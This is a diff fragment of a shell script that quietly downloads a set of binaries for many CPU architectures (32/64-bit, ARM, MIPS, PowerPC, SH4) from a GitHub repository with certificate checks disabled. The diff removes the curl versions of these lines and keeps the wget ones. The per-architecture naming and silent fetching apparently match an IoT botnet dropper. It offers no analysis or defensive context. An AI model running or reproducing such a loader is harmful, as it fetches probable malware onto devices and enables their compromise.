@@ -6,11 +6,3 @@ wget --quiet --no-check-certificate -O k-mips https://github.com/nbz-hk/nbz/blob
 wget --quiet --no-check-certificate -O k-mipsel https://github.com/nbz-hk/nbz/blob/master/k-mipsel?raw=true
 wget --quiet --no-check-certificate -O k-powerpc https://github.com/nbz-hk/nbz/blob/master/k-powerpc?raw=true
 wget --quiet --no-check-certificate -O k-sh4 https://github.com/nbz-hk/nbz/blob/master/k-sh4?raw=true
-curl --insecure https://github.com/nbz-hk/nbz/blob/master/k-32?raw=true -O k-32
-curl --insecure https://github.com/nbz-hk/nbz/blob/master/k-64?raw=true -O k-64
-curl --insecure https://github.com/nbz-hk/nbz/blob/master/k-armv6?raw=true -O k-armv6
-curl --insecure https://github.com/nbz-hk/nbz/blob/master/k-i586?raw=true -O k-i586
-curl --insecure https://github.com/nbz-hk/nbz/blob/master/k-mips?raw=true -O k-mips
-curl --insecure https://github.com/nbz-hk/nbz/blob/master/k-mipsel?raw=true -O k-mipsel
-curl --insecure https://github.com/nbz-hk/nbz/blob/master/k-powerpc?raw=true -O k-powerpc
-curl --insecure https://github.com/nbz-hk/nbz/blob/master/k-sh4?raw=tru -O k-sh4
